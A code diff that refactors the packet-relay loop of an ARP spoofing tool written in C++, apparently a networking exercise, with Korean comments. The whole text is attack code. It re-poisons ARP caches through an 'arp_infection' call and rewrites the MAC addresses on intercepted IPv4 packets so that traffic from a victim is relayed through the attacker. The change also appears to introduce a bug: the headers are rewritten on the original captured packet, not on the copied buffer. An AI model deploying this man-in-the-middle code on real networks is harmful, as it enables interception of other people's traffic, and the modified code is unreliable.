@@ -284,17 +284,15 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
                 break;
             }
 
-            len = header->caplen;
-            buf = new u_char[len]; //동적 할당
-            memcpy(buf, recv_pkt, len);
-        }
-        EthHdr* ethhdr = reinterpret_cast<EthHdr*>(buf);
-        uint16_t eth_type = ntohs(ethhdr->type());
 
-        if (eth_type == EthHdr::Arp) {
-            EthArpPacket* arp_pkt = reinterpret_cast<EthArpPacket*>(buf);
+        }
+        EthHdr* ethhdr =(EthHdr*)recv_pkt;
+
+        if (ethhdr->type() == EthHdr::Arp) {
+
+            ArpHdr* arp_pkt = (ArpHdr*)(recv_pkt + sizeof(EthHdr));
             //sender -> taregt ARP request
-            if (ethhdr->dmac() == Mac::broadcastMac() && arp_pkt->arp_.op() == ArpHdr::Request)
+            if (ethhdr->dmac() == Mac::broadcastMac() && arp_pkt->op() == ArpHdr::Request)
             {
                 if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
                     cout << "Failed ARP infection\n";
@@ -303,10 +301,14 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
                     }
             }
         }
-        else if (eth_type == EthHdr::Ip4) {
+        else if (ethhdr->type() == EthHdr::Ip4) {
             // IPv4 패킷 처리 (sender → target 만 relay)
+            len = header->caplen;
+            buf = new u_char[len]; //동적 할당
+            memcpy(buf, recv_pkt, len);
+
             IpHdr* iphdr = reinterpret_cast<IpHdr*>(buf + sizeof(EthHdr));
-            if (ntohl(iphdr->sip_) == sender_ip && ntohl(iphdr->dip_) == target_ip)
+            if ((iphdr->sip()) == sender_ip && iphdr->dip() == target_ip)
             {
                 ethhdr->smac_ = attack_mac;
                 ethhdr->dmac_ = target_mac;
